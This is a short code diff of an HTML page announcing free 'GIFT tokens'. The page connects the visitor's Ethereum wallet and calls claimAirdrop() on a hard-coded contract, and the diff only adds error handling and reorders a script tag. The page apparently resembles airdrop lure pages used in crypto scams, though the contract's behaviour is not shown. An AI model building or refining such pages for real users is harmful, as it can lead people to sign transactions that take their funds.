@@ -5,21 +5,30 @@
     <h2>🎁 You’ve received GIFT tokens!</h2>
     <button onclick="connect()">Connect Wallet</button>
 
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <script>
       async function connect() {
-        const provider = window.ethereum;
-        await provider.request({ method: 'eth_requestAccounts' });
+        try {
+          const provider = window.ethereum;
+          await provider.request({ method: 'eth_requestAccounts' });
 
-        const signer = (new ethers.providers.Web3Provider(provider)).getSigner();
-        const contract = new ethers.Contract(
-          "0xe74e35d18ea6c9758b4def3fe82dde0ef4148eb4",
-          ["function claimAirdrop() public"],
-          signer
-        );
+          const signer = (new ethers.providers.Web3Provider(provider)).getSigner();
+          const contract = new ethers.Contract(
+            "0xe74e35d18ea6c9758b4def3fe82dde0ef4148eb4",
+            ["function claimAirdrop() public"],
+            signer
+          );
 
-        await contract.claimAirdrop();
+          await contract.claimAirdrop().catch((err) => {
+            console.error("Transaction failed:", err);
+            alert("Claim failed. Check console for details.");
+          });
+
+        } catch (e) {
+          console.error("Wallet connection failed:", e);
+          alert("Wallet connection error");
+        }
       }
     </script>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
   </body>
 </html>
